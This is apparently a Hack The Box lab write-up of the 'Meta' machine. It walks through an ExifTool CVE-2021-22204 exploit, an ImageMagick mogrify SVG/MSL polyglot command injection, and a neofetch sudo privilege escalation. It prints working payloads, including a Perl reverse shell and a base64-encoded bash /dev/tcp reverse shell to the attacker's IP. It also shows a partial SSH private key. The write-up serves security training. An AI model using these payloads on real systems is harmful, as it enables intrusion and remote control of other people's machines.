---
title: HTB: Meta
url: https://0xdf.gitlab.io/2022/06/11/htb-meta.html
date: 2022-06-11T13:45:00+00:00
difficulty: Medium [30]
os: Linux
tags: hackthebox, ctf, htb-meta, nmap, wfuzz, vhosts, feroxbuster, exiftool, composer, cve-2021-22204, command-injection, pspy, mogrify, cve-2020-29599, polyglot, hackvent, image-magick, image-magick-scripting-language, neofetch, gtfobins, source-code, oscp-like-v2
---

![Meta](https://0xdfimages.gitlab.io/img/meta-cover.png)

Meta was all about image processing. It starts with an image metadata service where I’ll exploit a CVE in exfiltool to get code execution. From there, I’ll exploit a cron running an ImageMagick script against uploaded files using an SVC/ImageMagick Scripting Language polyglot to get shell as the user. For root, I’ll abuse neofetch and environment variables.

## Box Info

| Name | [Meta](https://hackthebox.com/machines/meta)  [Meta](https://hackthebox.com/machines/meta) [Play on HackTheBox](https://hackthebox.com/machines/meta) |
| --- | --- |
| Release Date | [22 Jan 2022](https://twitter.com/hackthebox_eu/status/1483831974552911872) |
| Retire Date | 11 Jun 2022 |
| OS | Linux Linux |
| Base Points | Medium [30] |
| Rated Difficulty | Rated difficulty for Meta |
| Radar Graph | Radar chart for Meta |
| First Blood User | 00:37:25[xct xct](https://app.hackthebox.com/users/13569) |
| First Blood Root | 00:44:21[InfoSecJack InfoSecJack](https://app.hackthebox.com/users/52045) |
| Creator | [Nauten Nauten](https://app.hackthebox.com/users/27582) |

## Recon

### nmap

`nmap` finds two open TCP ports, SSH (22) and HTTP (80):

```

oxdf@hacky$ nmap -p- --min-rate 10000 10.10.11.140
Starting Nmap 7.80 ( https://nmap.org ) at 2022-06-03 18:50 UTC
Nmap scan report for 10.10.11.140
Host is up (0.095s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 7.72 seconds
oxdf@hacky$ nmap -p 22,80 -sCV 10.10.11.140
Starting Nmap 7.80 ( https://nmap.org ) at 2022-06-03 18:51 UTC
Nmap scan report for 10.10.11.140
Host is up (0.089s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 12:81:17:5a:5a:c9:c6:00:db:f0:ed:93:64:fd:1e:08 (RSA)
|   256 b5:e5:59:53:00:18:96:a6:f8:42:d8:c7:fb:13:20:49 (ECDSA)
|_  256 05:e9:df:71:b5:9f:25:03:6b:d0:46:8d:05:45:44:20 (ED25519)
80/tcp open  http    Apache httpd
|_http-server-header: Apache
|_http-title: Did not follow redirect to http://artcorp.htb
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.08 seconds

```

Based on the [OpenSSH](https://packages.debian.org/search?keywords=openssh-server) version, the host is likely running Debian 10 buster. `nmap` also identifies that the root is a redirect to `artcorp.htb`.

### Subdomain Fuzz

Given the use of domain names, I’ll fuzz for subdomains using virtual host routing using `wfuzz`. I’ll start it with no filtering, and see that the default response is 0 lines, 0 words, 0 characters. I’ll add `--hh 0` to hide responses with 0 characters, and run again. There’s one response:

```

oxdf@hacky$ wfuzz -u http://10.10.11.140 -H "Host: FUZZ.artcorp.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --hh 0
********************************************************
* Wfuzz 2.4.5 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.11.140/
Total requests: 4989

===================================================================
ID           Response   Lines    Word     Chars       Payload
===================================================================

000001492:   200        9 L      24 W     247 Ch      "dev01"

Total time: 45.76619
Processed Requests: 4989
Filtered Requests: 4988
Requests/sec.: 109.0105

```

I’ll add both `artcorp.htb` and `dev01.artcorp.htb` to my `/etc/hosts` file:

```
10.10.11.140 artcorp.htb dev01.artcorp.htb

```

### artcorp.htb - TCP 80

#### Site

The site is for a graphics software dev company:

[![image-20220603150540748](https://0xdfimages.gitlab.io/img/image-20220603150540748.png)](https://0xdfimages.gitlab.io/img/image-20220603150540748.png)

[*Click for full image*](https://0xdfimages.gitlab.io/img/image-20220603150540748.png)

The links on the page don’t go anywhere off page.

#### Tech Stack

The site loads as `/index.html`, which suggests a static site. Not much else to see here.

#### Directory Brute Force

I’ll run `feroxbuster` against the site:

```

oxdf@hacky$ feroxbuster -u http://artcorp.htb

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.7.1
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://artcorp.htb
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.7.1
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
301      GET        7l       20w      231c http://artcorp.htb/css => http://artcorp.htb/css/
200      GET       86l      263w     4427c http://artcorp.htb/
301      GET        7l       20w      234c http://artcorp.htb/assets => http://artcorp.htb/assets/
403      GET        7l       20w      199c http://artcorp.htb/server-status
[####################] - 1m    120000/120000  0s      found:4       errors:78     
[####################] - 1m     30000/30000   353/s   http://artcorp.htb 
[####################] - 1m     30000/30000   354/s   http://artcorp.htb/ 
[####################] - 1m     30000/30000   355/s   http://artcorp.htb/css 
[####################] - 1m     30000/30000   344/s   http://artcorp.htb/assets 

```

It finds some basic folders, as well as an Apache `server-status` page. Nothing interesting here.

### dev01.artcorp.htb - TCP 80

#### Site

This is a very plain site, which lists “applications in development”:

![image-20220603150929302](https://0xdfimages.gitlab.io/img/image-20220603150929302.png)

The link goes to `/metaview/`, which is an app that returns metadata about an image:

![image-20220603151010340](https://0xdfimages.gitlab.io/img/image-20220603151010340.png)

If I give it a file, it returns some metadata about the file:

![image-20220603151157669](https://0xdfimages.gitlab.io/img/image-20220603151157669.png)

This is a subset of the data that I get when I run `exiftool` on the same image:

```

oxdf@hacky$ exiftool ~/Pictures/htb-desktop.png 
ExifTool Version Number         : 11.88
File Name                       : htb-desktop.png
Directory                       : /home/oxdf/Pictures
File Size                       : 184 kB
File Modification Date/Time     : 2022:01:25 16:18:42+00:00
File Access Date/Time           : 2022:06:03 19:11:05+00:00
File Inode Change Date/Time     : 2022:01:25 16:19:08+00:00
File Permissions                : rwxrwx---
File Type                       : PNG
File Type Extension             : png
MIME Type                       : image/png
Image Width                     : 1593
Image Height                    : 635
Bit Depth                       : 8
Color Type                      : RGB
Compression                     : Deflate/Inflate
Filter                          : Adaptive
Interlace                       : Noninterlaced
Image Size                      : 1593x635
Megapixels                      : 1.0

```

#### Tech Stack

The page loads as `index.php`, but there’s not much else.

#### Directory Brute Force

I’ll run `feroxbuster` against the site and include `-x php` since the site is PHP, but it doesn’t find anything else:

```

oxdf@hacky$ feroxbuster -u http://dev01.artcorp.htb -x php

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.7.1
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://dev01.artcorp.htb
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.7.1
 💲  Extensions            │ [php]
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
200      GET        9l       24w      247c http://dev01.artcorp.htb/
403      GET        7l       20w      199c http://dev01.artcorp.htb/.php
200      GET        9l       24w      247c http://dev01.artcorp.htb/index.php
403      GET        7l       20w      199c http://dev01.artcorp.htb/server-status
[####################] - 1m    120000/120000  0s      found:4       errors:0      
[####################] - 1m     60000/60000   526/s   http://dev01.artcorp.htb 
[####################] - 1m     60000/60000   531/s   http://dev01.artcorp.htb/ 

```

Since it didn’t find `/metaview`, I’ll scan that one manually:

```

oxdf@hacky$ feroxbuster -u http://dev01.artcorp.htb/metaview -x php

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.7.1
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://dev01.artcorp.htb/metaview
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.7.1
 💲  Extensions            │ [php]
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
301      GET        7l       20w      242c http://dev01.artcorp.htb/metaview => http://dev01.artcorp.htb/metaview/
403      GET        7l       20w      199c http://dev01.artcorp.htb/.php
301      GET        7l       20w      246c http://dev01.artcorp.htb/metaview/lib => http://dev01.artcorp.htb/metaview/lib/
301      GET        7l       20w      250c http://dev01.artcorp.htb/metaview/uploads => http://dev01.artcorp.htb/metaview/uploads/
301      GET        7l       20w      249c http://dev01.artcorp.htb/metaview/assets => http://dev01.artcorp.htb/metaview/assets/
301      GET        7l       20w      246c http://dev01.artcorp.htb/metaview/css => http://dev01.artcorp.htb/metaview/css/
200      GET       33l       83w     1404c http://dev01.artcorp.htb/metaview/index.php
403      GET        7l       20w      199c http://dev01.artcorp.htb/metaview/.php
301      GET        7l       20w      249c http://dev01.artcorp.htb/metaview/vendor => http://dev01.artcorp.htb/metaview/vendor/
200      GET        0l        0w        0c http://dev01.artcorp.htb/metaview/vendor/autoload.php
301      GET        7l       20w      258c http://dev01.artcorp.htb/metaview/vendor/composer => http://dev01.artcorp.htb/metaview/vendor/composer/
200      GET       56l      398w     2919c http://dev01.artcorp.htb/metaview/vendor/composer/LICENSE
...[snip]...

```

The `uploads` directory is most interesting. In general I’d want to keep that in mind, though it won’t come into play for Meta.

It also shows `composer`, which is a [PHP package manager](https://getcomposer.org/). I’ll check for `composer.json` files, and find one at `/metaview/composer.json`:

![image-20220603160441568](https://0xdfimages.gitlab.io/img/image-20220603160441568.png)

That file does exist at `/metaview/lib/ExifToolWrapper.php`, but it just returns a blank page (typically of PHP included files). If I hadn’t of recognized the page was using `exiftool` earlier, this would be a good signal.

## Shell as www-data

### Exiftool Exploit

#### CVE-2021-22204 Background

Having recognized `exiftool` in use, some Googling for “exiftool CVE” returns [this HackerOne report](https://hackerone.com/reports/1154542). It’s being submitted to GitLab, but it turns out to be a vulnerability in `exiftool`. [This blog post](https://devcraft.io/2021/05/04/exiftool-arbitrary-code-execution-cve-2021-22204.html) by the researcher who discovered the vulnerability shows the details and how it was discovered (it’s a really interesting read).

`exiftool` is actually written in Perl. The vulnerability is located in a branch of the script that parses DjVu files, [which are](https://en.wikipedia.org/wiki/DjVu):

> a [computer](https://en.wikipedia.org/wiki/Computer) [file format](https://en.wikipedia.org/wiki/File_format) designed primarily to store [scanned documents](https://en.wikipedia.org/wiki/Image_scanner), especially those containing a combination of text, line drawings, [indexed color images](https://en.wikipedia.org/wiki/Indexed_color), and photographs. It uses technologies such as image layer separation of text and background/images, [progressive loading](https://en.wikipedia.org/wiki/Interlacing_(bitmaps)), [arithmetic coding](https://en.wikipedia.org/wiki/Arithmetic_coding), and [lossy compression](https://en.wikipedia.org/wiki/Lossy_compression) for [bitonal](https://en.wikipedia.org/wiki/Binary_image) ([monochrome](https://en.wikipedia.org/wiki/Monochrome)) images. This allows high-quality, readable images to be stored in a minimum of space, so that they can be made available on the [web](https://en.wikipedia.org/wiki/World_Wide_Web).

Putting something that looks like the following into the DjVu metadata will cause `exiftool` to run ` date` and show the output in the result:

```

(metadata
    (Author "\
" . return `date`; #")
)

```

#### POC

There are a ton of POCs that can be found by Goolging for “CVE-2021-22204 POC”. I liked [this one](https://github.com/UNICORDev/exploit-CVE-2021-22204) because it’s written in Python and has a nice user interface.

When I first try to run it, it errors out saying I am missing the DjVu support libraries, which I’ll install with `sudo apt install djvulibre-bin`. Then I can run it, giving a command to run. I’ll start with `id`:

```

oxdf@hacky$ python /opt/exploit-CVE-2021-22204/exploit-CVE-2021-22204.py -c 'id'

        _ __,~~~/_        __  ___  _______________  ___  ___
    ,~~`( )_( )-\|       / / / / |/ /  _/ ___/ __ \/ _ \/ _ \
        |/|  `--.       / /_/ /    // // /__/ /_/ / , _/ // /
_V__v___!_!__!_____V____\____/_/|_/___/\___/\____/_/|_/____/....
    
UNICORD: Exploit for CVE-2021-22204 (ExifTool) - Arbitrary Code Execution
PAYLOAD: (metadata "\c${system('id')};")
DEPENDS: Dependencies for exploit are met!
PREPARE: Payload written to file!
PREPARE: Payload file compressed!
PREPARE: DjVu file created!
PREPARE: JPEG image created/processed!
PREPARE: Exiftool config written to file!
EXPLOIT: Payload injected into image!
CLEANUP: Old file artifacts deleted!
SUCCESS: Exploit image written to "image.jpg"

```

It compresses the DjVu format into a `.jpg` file. On uploading that to Meta, there’s execition:

![image-20220603162451231](https://0xdfimages.gitlab.io/img/image-20220603162451231.png)

### Shell

The tool help shows that the `-s` flag will spawn a reverse shell:

```

oxdf@hacky$ python /opt/exploit-CVE-2021-22204/exploit-CVE-2021-22204.py
UNICORD Exploit for CVE-2021-22204 (ExifTool) - Arbitrary Code Execution

Usage:
  python3 exploit-CVE-2021-22204.py -c <command>
  python3 exploit-CVE-2021-22204.py -s <local-IP> <local-port>
  python3 exploit-CVE-2021-22204.py -c <command> [-i <image.jpg>]
  python3 exploit-CVE-2021-22204.py -s <local-IP> <local-port> [-i <image.jpg>]
  python3 exploit-CVE-2021-22204.py -h

Options:
  -c    Custom command mode. Provide command to execute.
  -s    Reverse shell mode. Provide local IP and port.
  -i    Path to custom JPEG image. (Optional)
  -h    Show this help menu.

```

Running that, it is using a Perl reverse shell (which makes sense, given it’s a command injection in Perl, so I can count on Perl being installed):

```

oxdf@hacky$ python /opt/exploit-CVE-2021-22204/exploit-CVE-2021-22204.py -s 10.10.14.6 443

        _ __,~~~/_        __  ___  _______________  ___  ___
    ,~~`( )_( )-\|       / / / / |/ /  _/ ___/ __ \/ _ \/ _ \
        |/|  `--.       / /_/ /    // // /__/ /_/ / , _/ // /
_V__v___!_!__!_____V____\____/_/|_/___/\___/\____/_/|_/____/....
    
UNICORD: Exploit for CVE-2021-22204 (ExifTool) - Arbitrary Code Execution
PAYLOAD: (metadata "\c${use Socket;socket(S,PF_INET,SOCK_STREAM,getprotobyname('tcp'));if(connect(S,sockaddr_in(443,inet_aton('10.10.14.6')))){open(STDIN,'>&S');open(STDOUT,'>&S');open(STDERR,'>&S');exec('/bin/sh -i');};};")
DEPENDS: Dependencies for exploit are met!
PREPARE: Payload written to file!
PREPARE: Payload file compressed!
PREPARE: DjVu file created!
PREPARE: JPEG image created/processed!
PREPARE: Exiftool config written to file!
EXPLOIT: Payload injected into image!
CLEANUP: Old file artifacts deleted!
SUCCESS: Exploit image written to "image.jpg"

```

I’ll start `nc` listening on 443, and upload this new image. The site hangs, but there’s a shell at `nc`:

```

oxdf@hacky$ nc -lvnp 443
Listening on 0.0.0.0 443
Connection received on 10.10.11.140 60630
/bin/sh: 0: can't access tty; job control turned off
$ 

```

I’ll upgrade my shell using `script` and `stty`:

```

$ script /dev/null -c bash
Script started, file is /dev/null
www-data@meta:/var/www/dev01.artcorp.htb/metaview$ ^Z
[1]+  Stopped                 nc -lvnp 443
oxdf@hacky$ stty raw -echo; fg
nc -lvnp 443
            reset
reset: unknown terminal type unknown
Terminal type? screen
www-data@meta:/var/www/dev01.artcorp.htb/metaview$ 

```

## Shell as thomas

### Enumeration

#### Home Directories

There’s one home directory on Meta:

```

www-data@meta:/home$ ls
thomas

```

This directory has `user.txt`, but www-data can’t read it:

```

www-data@meta:/home/thomas$ ls -la
total 32
drwxr-xr-x 4 thomas thomas 4096 Jan 17 07:53 .
drwxr-xr-x 3 root   root   4096 Aug 29  2021 ..
lrwxrwxrwx 1 root   root      9 Aug 29  2021 .bash_history -> /dev/null
-rw-r--r-- 1 thomas thomas  220 Aug 29  2021 .bash_logout
-rw-r--r-- 1 thomas thomas 3526 Aug 29  2021 .bashrc
drwxr-xr-x 3 thomas thomas 4096 Aug 30  2021 .config
-rw-r--r-- 1 thomas thomas  807 Aug 29  2021 .profile
drwx------ 2 thomas thomas 4096 Jan  4 10:22 .ssh
-rw-r----- 1 root   thomas   33 Jun  3 14:41 user.txt

```

#### Processes

After not finding much else, I’ll upload [pspy](https://github.com/DominicBreuker/pspy) to look for anything that might be running on a cron, especially as thomas. I’ll host the file on my computer with a Python webserver (`python3 -m http.server 80`), and then fetch it to `/dev/shm` using `wget`:

```

www-data@meta:/dev/shm$ wget 10.10.14.6/pspy64 
--2022-06-03 16:32:38--  http://10.10.14.6/pspy64
Connecting to 10.10.14.6:80... connected.
HTTP request sent, awaiting response... 200 OK 
Length: 3078592 (2.9M) [application/octet-stream]
Saving to: 'pspy64'
                                                            
pspy64              100%[===================>]   2.94M  2.31MB/s    in 1.3s    

2022-06-03 16:32:40 (2.31 MB/s) - 'pspy64' saved [3078592/3078592]

www-data@meta:/dev/shm$ chmod +x ./pspy64

```

When I run it, I’ll see that every minute there’s some interesting activity as thomas:

```

www-data@meta:/dev/shm$ ./pspy64               
pspy - version: v1.2.0 - Commit SHA: 9c63e5d6c58f7bcdc235db663f5e3fe1c33b8855

     ██▓███    ██████  ██▓███ ▓██   ██▓                   
    ▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒
    ▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░        
    ▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░        
    ▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░        
    ▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒                                                                                  
    ░▒ ░     ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░         
    ░░       ░  ░  ░  ░░       ▒ ▒ ░░          
                   ░           ░ ░             
                               ░ ░ 
...[snip]...
2022/06/03 16:35:01 CMD: UID=0    PID=3079   | /usr/sbin/CRON -f 
2022/06/03 16:35:01 CMD: UID=0    PID=3078   | /usr/sbin/CRON -f 
2022/06/03 16:35:01 CMD: UID=0    PID=3080   | /bin/sh -c rm /tmp/* 
2022/06/03 16:35:01 CMD: UID=0    PID=3082   | /usr/sbin/CRON -f 
2022/06/03 16:35:01 CMD: UID=???  PID=3081   | ???
2022/06/03 16:35:01 CMD: UID=1000 PID=3084   | /usr/local/bin/mogrify -format png *.* 
2022/06/03 16:35:01 CMD: UID=1000 PID=3083   | /bin/bash /usr/local/bin/convert_images.sh 
2022/06/03 16:35:01 CMD: UID=1000 PID=3085   | pkill mogrify 
...[snip]...

```

It’s running `/usr/local/bin/convert_images.sh`, which is likely calling `mogrify`.

Sometimes there are also root crons that are cleaning up the images from the website, and setting back thomas’ `.config/neofetch/config.conf` to a copy from root’s home directory as well.

`convert_images.sh` is going into the `dev01` directory and running `mogrify` on the images:

```

#!/bin/bash
cd /var/www/dev01.artcorp.htb/convert_images/ && /usr/local/bin/mogrify -format png *.* 2>/dev/null
pkill mogrify

```

#### mogrify CVE

`mogrify` is a part of the ImageMagick tool suite, and [boasts that it](https://imagemagick.org/script/mogrify.php) can:

> resize an image, blur, crop, despeckle, dither, draw on, flip, join, re-sample, and much more. This tool is similar to [magick](https://imagemagick.org/script/convert.php) except that the original image file is *overwritten* (unless you change the file suffix with the [-format](https://imagemagick.org/script/command-line-options.php#format) option) with any changes you request.

The version on Meta is 7.0.10-36:

```

www-data@meta:/dev/shm$ mogrify -version
Version: ImageMagick 7.0.10-36 Q16 x86_64 2021-08-29 https://imagemagick.org
Copyright: © 1999-2020 ImageMagick Studio LLC
License: https://imagemagick.org/script/license.php
Features: Cipher DPC HDRI OpenMP(4.5) 
Delegates (built-in): fontconfig freetype jng jpeg png x xml zlib

```

Goolging for “mogrify CVE” doesn’t find much interesting, but searching for “imagemagick 7.0.10-36 exploit” finds many posts talking about XML injection, [CVE-2020-29599](https://www.cybersecurity-help.cz/vdb/SB2020121303).

### mogrify Command Injection

#### Background

It was a bit trickier to find, but [this post](https://insert-script.blogspot.com/2020/11/imagemagick-shell-injection-via-pdf.html) has all the details of this exploit. The author creates a SVG/MSL [polyglot file](https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a). A polyglot is a file that is valid for two different file specifications (I have found memories of [HackVent 2020 day 20](/hackvent2020/leet#hv2020), where I was given a file that was both valid HTML and valid PNG).

In this case, it’s valid as both a scalable vector graphic (SVG) file and a ImageMagick Scripting Language (MSL) file. The POC is:

```

<image authenticate='ff" `echo $(id)> ./0wned`;"'>
  <read filename="pdf:/etc/passwd"/>
  <get width="base-width" height="base-height" />
  <resize geometry="400x400" />
  <write filename="test.png" />
  <svg width="700" height="700" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">       
  <image xlink:href="msl:poc.svg" height="100" width="100"/>
  </svg>
</image>

```

There’s a command injection in backticks in the first line.

#### POC

To test if this works, I’ll change the payload slightly to output a file in `/dev/shm` (to not make a mess of the web folder):

```

<image authenticate='ff" `echo $(id)> /dev/shm/.0xdf`;"'>
  <read filename="pdf:/etc/passwd"/>
  <get width="base-width" height="base-height" />
  <resize geometry="400x400" />
  <write filename="test.png" />
  <svg width="700" height="700" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">       
  <image xlink:href="msl:poc.svg" height="100" width="100"/>
  </svg>
</image>

```

It’s also important to note that the third to last line has a reference back to the file, `poc.svg`. I’ll need to call it that on Meta, or the exploit won’t work.

I’ll serve that file with Python, and upload it to Meta with `wget`. I can run the command as www-data and see what happens.

```

www-data@meta:/var/www/dev01.artcorp.htb/convert_images$ mogrify -format png *.*    
sh: 1: : Permission denied
mogrify: MagickCore/image.c:1168: DestroyImage: Assertion `image != (Image *) NULL' failed.
Aborted

```

It created a file:

```

www-data@meta:/var/www/dev01.artcorp.htb/convert_images$ cat /dev/shm/.0xdf 
uid=33(www-data) gid=33(www-data) groups=33(www-data)

```

This is where I figured out that the name needed to match what was in the file. If there’s a mismatch:

```

www-data@meta:/var/www/dev01.artcorp.htb/convert_images$ mogrify -format png *.*
mogrify: unable to open image 'poc.svg': No such file or directory @ error/blob.c/OpenBlob/3537.
mogrify: unable to open file 'poc.svg': No such file or directory @ error/msl.c/ProcessMSLScript/7839.
mogrify: non-conforming drawing primitive definition `image' @ error/draw.c/RenderMVGContent/4458.

```

It’s complaining that it can’t open `poc.svg`.

I’ll delete `/dev/shm/.0xdf`, make sure the name is correct, and wait for the minute to roll over. Once it does, `.0xdf` is back, and this time, it’s owned by thomas and the contents show it was run by thomas:

```

www-data@meta:/var/www/dev01.artcorp.htb/convert_images$ ls -la /dev/shm/
total 3012
drwxrwxrwt  2 root     root          80 Jun  3 17:08 .
drwxr-xr-x 16 root     root        3080 Jun  3 14:40 ..
-rw-r--r--  1 thomas   thomas        54 Jun  3 17:08 .0xdf
-rwxr-xr-x  1 www-data www-data 3078592 Dec  6 15:32 pspy64 
www-data@meta:/var/www/dev01.artcorp.htb/convert_images$ cat /dev/shm/.0xdf
uid=1000(thomas) gid=1000(thomas) groups=1000(thomas)    

```

#### Shell

To avoid special characters, I’ll base64 encode a [bash reverse shell](https://www.youtube.com/watch?v=OjkVep2EIlw):

```

oxdf@hacky$ echo 'bash  -i >& /dev/tcp/10.10.14.6/444 0>&1 ' | base64
YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuNi80NDQgMD4mMSAK

```

I’ve added a couple extra spaces to get rid of a `+` and the `=`. Now I’ll generate the payload:

```

<image authenticate='ff" `echo "YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuNi80NDQgMD4mMSAK" | base64 -d | bash`;"'>
  <read filename="pdf:/etc/passwd"/>
  <get width="base-width" height="base-height" />
  <resize geometry="400x400" />
  <write filename="test.png" />
  <svg width="700" height="700" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
  <image xlink:href="msl:mog-shell.svg" height="100" width="100"/>
  </svg>
</image>

```

I’ll upload that to Meta as `mog-shell.svg` (matching the `xlink:href` line in the file). I can test it to get a shell as www-data, or wait for the cron which creates a shell as thomas:

```

oxdf@hacky$ nc -lvnp 444
Listening on 0.0.0.0 444
Connection received on 10.10.11.140 36076
bash: cannot set terminal process group (3961): Inappropriate ioctl for device
bash: no job control in this shell
thomas@meta:/var/www/dev01.artcorp.htb/convert_images$

```

### SSH

I could upgrade my shell, but there’s also an RSA key pair in `/home/thomas/.ssh`:

```

thomas@meta:~/.ssh$ cat id_rsa
cat id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEAt9IoI5gHtz8omhsaZ9Gy+wXyNZPp5jJZvbOJ946OI4g2kRRDHDm5
x7up3z5s/H/yujgjgroOOHh9zBBuiZ1Jn1jlveRM7H1VLbtY8k/rN9PFe/MkRsYdH45IvV
...[snip]...

```

I’ll just grab the private key and connect over SSH:

```

oxdf@hacky$ ssh -i ~/keys/meta-thomas thomas@10.10.11.140
Linux meta 4.19.0-17-amd64 #1 SMP Debian 4.19.194-3 (2021-07-18) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
thomas@meta:~$ 

```

And grab `user.txt`:

```

thomas@meta:~$ cat user.txt
b95bb4c4************************

```

## Shell as root

### Enumeration

#### sudo

thomas can run `sudo` as root for the command `neofetch`:

```

thomas@meta:~$ sudo -l
Matching Defaults entries for thomas on meta:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, env_keep+=XDG_CONFIG_HOME

User thomas may run the following commands on meta:
    (root) NOPASSWD: /usr/bin/neofetch \"\"

```

The `\"\"` at the end is designed to prevent any other parameters from being added when run with `sudo`.

I’ll also note that `env_keep+=XDG_CONFIG_HOME` is set. `env_keep` defines environment variables that are preserved when the user changes. `XDG_CONFIG_HOME` is the [directory where user configs](https://specifications.freedesktop.org/basedir-spec/basedir-spec-latest.html) are stored:

> `$XDG_CONFIG_HOME` defines the base directory relative to which user-specific configuration files should be stored. If `$XDG_CONFIG_HOME` is either not set or empty, a default equal to `$HOME`/.config should be used.

On Meta, for thomas, it’s empty:

```

thomas@meta:~$ echo "$XDG_CONFIG_HOME"

thomas@meta:~$ echo "$HOME"
/home/thomas

```

This means that it’s `/home/thomas/.config`.

#### neofetch

`neofetch` is a Bash tool for showing [system information](https://github.com/dylanaraps/neofetch) in a nice way.

![image-20220603173927759](https://0xdfimages.gitlab.io/img/image-20220603173927759.png)

Running it with `sudo` shows root as the user:

![image-20220603173959851](https://0xdfimages.gitlab.io/img/image-20220603173959851.png)

### Shell

#### GTFObins

GTFObins has a [page](https://gtfobins.github.io/gtfobins/neofetch/) for `neofetch`, which shows getting a shell by creating a temporary config file and executing with that config:

```

TF=$(mktemp)
echo 'exec /bin/sh' >$TF
neofetch --config $TF

```

The `sudo` rule prevents my specifying a different config. But I can use the default config location (which was slightly spoiled by the cron reverting that I noticed earlier.)

#### Config Location

The `neofetch` [docs](https://github.com/dylanaraps/neofetch/wiki/Customizing-Info#config-file-location) have a section on “Config File Location”, which say it’s `${HOME}/.config/neofetch/config.conf`. That’s actually slightly misleading. Looking at the [source itself](https://github.com/dylanaraps/neofetch/blob/master/neofetch#L4775-L4797), there’s a `get_user_config()` function that tries to load a config from:
- a location given with `--config`
- `${XDG_CONFIG_HOME}/neofetch/config.conf`
- `${XDG_CONFIG_HOME}/neofetch/config`
- nowhere if `$no_config` is set

If it fails all those, it copies the default config from into `${XDG_CONFIG_HOME}/neofetch/config.conf`.

At the very top of the file, it sets `XDG_CONFIG_HOME=${XDG_CONFIG_HOME:-${HOME}/.config}`. That means if `XDG_CONFIG_HOME` isn’t set, it will set it using the `$HOME` variable, which explains the documentation.

#### Exploit

I’ll write the `exec` line from GTFObins into the config:

```

thomas@meta:~$ echo 'exec /bin/sh' > .config/neofetch/config.conf 
thomas@meta:~$ XDG_CONFIG_HOME=~/.config sudo neofetch
# id
uid=0(root) gid=0(root) groups=0(root)
# bash
root@meta:/home/thomas#

```

If I run without explicitly setting `$XDG_CONFIG_HOME`, it doesn’t do anything:

```

thomas@meta:~$ sudo neofetch
       _,met$$$$$gg.          root@meta 
    ,g$$$$$$$$$$$$$$$P.       --------- 
  ,g$$P"     """Y$$.".        OS: Debian GNU/Linux 10 (buster) x86_64 
 ,$$P'              `$$$.     Host: VMware Virtual Platform None 
